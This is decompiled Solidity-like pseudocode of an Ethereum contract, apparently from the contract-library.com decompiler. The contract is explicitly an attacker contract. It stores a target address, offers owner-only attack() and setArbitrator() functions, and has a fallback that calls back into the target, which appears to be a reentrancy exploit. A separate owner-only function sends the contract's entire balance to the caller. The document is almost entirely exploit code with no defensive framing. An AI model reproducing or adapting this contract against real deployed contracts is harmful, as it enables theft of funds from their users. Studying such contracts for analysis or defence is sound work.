// Decompiled at www.contract-library.com
// 2019.11.28 17:29 UTC

// Data structures and variables inferred from the use of storage instructions
uint256 _owner; // STORAGE[0x0]
uint256 ___function_selector__; // STORAGE[0x1]
uint256 stor_3; // STORAGE[0x3]
uint256 stor_4; // STORAGE[0x4]
uint256 stor_5; // STORAGE[0x5]
uint256 stor_6; // STORAGE[0x6]

// Events

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.
function __function_selector__(uint32 function_selector) public {
  if (msg.data.length() >= 0x4) {
    if (function_selector == 0x2e01d229) Attacker(address); // stack operands: ()
    if (0x87f14e6f == function_selector) 0x87f14e6f; // stack operands: ()
    if (0x88836eb5 == function_selector) 0x88836eb5; // stack operands: ()
    if (0x8da5cb5b == function_selector) owner(); // stack operands: ()
    if (0x9e5faafc == function_selector) attack(); // stack operands: ()
    if (0xb0eefabe == function_selector) setArbitrator(address); // stack operands: ()
    if (0xd0e30db0 == function_selector) deposit(); // stack operands: ()
    if (0xf2fde38b == function_selector) transferOwnership(address); // stack operands: ()
  }
  if (!(0xff & ___function_selector__ >> 160)) {
    ___function_selector__ = 0x10000000000000000000000000000000000000000 | (0xffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff & ___function_selector__);
    require(extcodesize(address(0x10000000000000000000000000000000000000000 | (0xffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff & ___function_selector__))));
    /*call status*/v170 = address(0x10000000000000000000000000000000000000000 | (0xffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff & ___function_selector__)).call(0x6d4a37ef << 224, (stor_3 << 128 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000), address(stor_4), address(stor_5), stor_6).gas(msg.gas - 710);
    require(v170);
  }
  exit();
}

function Attacker(address varg0) public {
  require(!msg.value);
  require(address(_owner) == address(msg.sender));
  ___function_selector__ = address(varg0) | (0xffffffffffffffffffffffff0000000000000000000000000000000000000000 & ___function_selector__);
  exit();
}

function 0x87f14e6f() public {
  require(!msg.value);
  require(address(_owner) == address(msg.sender));
  /*call status*/v30b = address(msg.sender).call().value(address(this).balance).gas((!address(this).balance * 0x8fc));
  exit();
}

function 0x88836eb5(uint256 varg0, address varg1, address varg2, uint256 varg3) public {
  require(!msg.value);
  require(address(_owner) == address(msg.sender));
  stor_3 = (varg0 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000) >> 128 | (0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 & stor_3);
  stor_4 = address(varg1) | (0xffffffffffffffffffffffff0000000000000000000000000000000000000000 & stor_4);
  stor_5 = address(varg2) | (0xffffffffffffffffffffffff0000000000000000000000000000000000000000 & stor_5);
  stor_6 = varg3;
  exit();
}

function owner() public {
  require(!msg.value);
  v3ab = address(_owner);
  return address(v3ab);
}

function attack() public {
  require(!msg.value);
  require(address(_owner) == address(msg.sender));
  ___function_selector__ = ___function_selector__ & 0xffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff;
  require(extcodesize(address(___function_selector__)));
  /*call status*/v48a = address(___function_selector__).call(0x6d4a37ef << 224, (stor_3 << 128 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000), address(stor_4), address(stor_5), stor_6).gas(msg.gas - 710);
  require(v48a);
  exit();
}

function setArbitrator(address varg0) public {
  require(!msg.value);
  require(address(_owner) == address(msg.sender));
  require(extcodesize(address(___function_selector__)));
  /*call status*/v50b = address(___function_selector__).call(0xb0eefabe << 224, address(varg0)).gas(msg.gas - 710);
  require(v50b);
  exit();
}

function deposit() public {
  exit();
}

function transferOwnership(address varg0) public {
  require(!msg.value);
  require(address(_owner) == address(msg.sender));
  require(address(varg0));
  _owner = address(varg0) | (0xffffffffffffffffffffffff0000000000000000000000000000000000000000 & _owner);
  exit();
}

